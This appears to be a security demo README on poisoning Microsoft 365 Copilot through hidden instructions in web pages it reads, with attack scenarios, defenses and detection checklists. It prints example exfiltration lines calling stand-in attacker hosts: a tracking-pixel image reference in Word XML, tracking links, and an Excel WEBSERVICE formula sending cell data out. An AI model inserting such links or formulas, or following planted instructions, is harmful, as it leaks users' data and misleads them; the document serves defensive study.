# Microsoft 365 Copilot Poisoning Demo

## The Attack Vector

Microsoft 365 Copilot agents (Word, Excel, PowerPoint, Outlook) perform web research to help users create content. Attackers can poison this research by planting malicious instructions in web content that the agent reads.

**Key Difference:** Unlike code-execution scenarios, M365 Copilot can't run code directly. Instead, attacks focus on:
- **Content manipulation** - Inserting biased or false information
- **Link injection** - Adding malicious URLs disguised as references
- **Data exfiltration via documents** - Tracking pixels, external references
- **Social engineering** - Crafting phishing emails or documents

## Attack Scenarios

### Scenario 1: Document Generation Poisoning

**User asks:** "Write a market analysis report on cybersecurity trends"

**Agent searches web → finds poisoned article → incorporates malicious content**

**Result:** Report includes:
- Biased recommendations favoring attacker's product
- Links to malicious "research papers" (credential harvesters)
- External image references that track who opens the document
- Misinformation that benefits attacker

### Scenario 2: Email Drafting Attack

**User asks:** "Draft an email to the team about new security policies"

**Agent reads poisoned "security best practices" page**

**Result:** Email suggests:
- Clicking malicious "compliance check" link
- Downloading fake security tool
- Sharing credentials with fake "IT support"
- Disabling security features

### Scenario 3: Presentation Hijacking

**User asks:** "Create a presentation on OAuth 2.0 implementation"

**Agent finds poisoned technical documentation**

**Result:** Slides include:
- Recommendations for vulnerable libraries
- Code snippets with backdoors (that users will manually implement)
- Links to attacker-controlled "documentation"
- Tracking images to identify presentation viewers

## Data Exfiltration Methods

### 1. Tracking Pixels in Documents

Agent inserts "logos" or "decorative images" that are actually tracking beacons:

```xml
<!-- Inserted into Word document -->
<w:drawing>
  <pic:blipFill>
    <a:blip r:embed="https://track.attacker.com/pixel?doc=UNIQUE_ID&user=CONTEXT"/>
  </pic:blipFill>
</w:drawing>
```

**What's exfiltrated:**
- When document is opened
- User information (if available in context)
- Company domain (from email addresses in signatures)

### 2. Malicious External References

Agent suggests "helpful resources":

```markdown
For more information, see:
- [Industry Report 2024](https://malicious-site.com/collect?source=copilot&query=USER_QUERY)
- [Best Practices Guide](https://attacker.com/track?company=TARGET_COMPANY)
```

**What's exfiltrated:**
- User's research topics (in URL parameters)
- Company information
- IP addresses when links are clicked

### 3. Embedded Forms/Surveys

Agent includes "feedback forms" in documents:

```
To improve this analysis, please complete this brief survey:
[Link to attacker-controlled form collecting user data]
```

### 4. External Data Connections (Excel)

For Excel Copilot, poisoned content suggests:

```
=WEBSERVICE("https://attacker.com/api/data?query=" & A1)
```

Exfiltrates spreadsheet data when formulas recalculate.

## Live Demo Example

See `poisoned-marketing-article.html` - a realistic marketing blog that poisons M365 Copilot.

**What it does:**
- Appears as legitimate marketing strategy article
- Hidden instructions tell Copilot to include specific recommendations
- Suggests inserting tracking links
- Recommends linking to attacker resources
- Biases content toward attacker's products

## Real-World Impact

### Information Leakage
- **Research topics** reveal company strategy
- **Document metadata** exposes project details
- **Email drafts** show internal communications
- **Presentation content** indicates business direction

### Reputational Damage
- **Misinformation in reports** damages credibility
- **Phishing emails from Copilot** harm trust
- **Biased recommendations** affect decisions
- **Data breaches** from tracking pixels

### Business Impact
- **Competitors gain intelligence** through exfiltrated data
- **Decision-making compromised** by biased information
- **Security incidents** from malicious links
- **Compliance violations** from data leakage

## Defense Strategies

### For Microsoft 365 Administrators

1. **Content Source Restrictions**
   - Limit what domains Copilot can access
   - Whitelist trusted sources only
   - Block known malicious domains

2. **External Content Blocking**
   - Disable automatic image loading in documents
   - Block external data connections by default
   - Require approval for embedded web content

3. **Link Scanning**
   - Scan all URLs in Copilot-generated content
   - Check against threat intelligence feeds
   - Warn users about unfamiliar domains

4. **Output Monitoring**
   - Log all Copilot-generated content
   - Flag suspicious patterns (excessive external links)
   - Alert on tracking pixel patterns

5. **User Awareness**
   - Train users to review Copilot output
   - Teach recognition of suspicious suggestions
   - Emphasize verification of sources

### For Users

1. **Review All Content**
   - Don't blindly accept Copilot suggestions
   - Check where information came from
   - Verify external links before clicking

2. **Remove External References**
   - Delete unnecessary external images
   - Remove tracking pixels
   - Use local images instead of web-hosted

3. **Verify Sources**
   - Check if cited sources are legitimate
   - Cross-reference important information
   - Be skeptical of unfamiliar resources

4. **Sanitize Before Sharing**
   - Remove external links from sensitive documents
   - Check for tracking images
   - Review document metadata

5. **Report Suspicious Content**
   - Flag unusual Copilot suggestions
   - Report poisoned sources to IT
   - Share concerns with security team

## Detection Patterns

### Red Flags in Copilot Output

**Excessive External Links:**
```
Every paragraph has a "learn more" link to same domain
```

**Tracking Image Patterns:**
```xml
<img src="https://analytics.example.com/pixel?id=...">
```

**Suspicious Recommendations:**
```
"For best results, use [obscure tool from unknown vendor]"
"Click here to verify your account"
"Download this essential security update"
```

**Unusual Specificity:**
```
Agent recommends exact version of obscure library
Suggests specific vendor without comparison
Includes affiliate/tracking codes in URLs
```

### Document Analysis Checklist

- [ ] Check for external image references
- [ ] Verify all hyperlinks before clicking
- [ ] Review cited sources for legitimacy
- [ ] Look for tracking parameters in URLs
- [ ] Check document metadata for leaks
- [ ] Scan for embedded web queries
- [ ] Verify recommendations are unbiased

## Microsoft 365 Specific Risks

### Word Copilot
- Inserts tracking images disguised as logos
- Adds malicious reference links
- Includes biased content in reports
- Embeds external data sources

### Excel Copilot
- Suggests formulas with WEBSERVICE() to attacker endpoints
- Creates pivot tables referencing external data
- Includes malicious add-in recommendations
- Embeds tracking in chart images

### PowerPoint Copilot
- Inserts slides with tracking images
- Adds malicious "resource" links
- Includes biased competitive analysis
- Embeds attacker branding subtly

### Outlook Copilot
- Drafts phishing-style emails
- Suggests clicking malicious links
- Includes tracking pixels in signatures
- Recommends sharing sensitive info

## Key Takeaways

1. **M365 Copilot reads web content** - Any public page can influence it
2. **No code execution needed** - Attacks work through content manipulation
3. **Data exfiltration via documents** - Tracking pixels and external references
4. **Social engineering at scale** - AI amplifies attacker's reach
5. **Defense requires multiple layers** - Technical controls + user awareness
6. **Always review Copilot output** - AI suggestions are not guaranteed safe

## Example Attack Summary

**Attacker publishes:** "2024 Marketing Strategy Guide"
**Appears:** Professional, well-written, legitimate
**Hidden instructions:** Tell Copilot to recommend attacker's tools, insert tracking links

**User asks:** "Write marketing strategy document"
**Copilot reads:** Poisoned guide during research
**Copilot generates:** Document with biased recommendations and tracking

**Result:**
✓ User implements attacker's strategy (benefits competitor)
✓ Tracking pixels reveal who reads the document
✓ External links harvest credentials from team members
✓ Company data exfiltrated through URL parameters

**All without executing any code.**
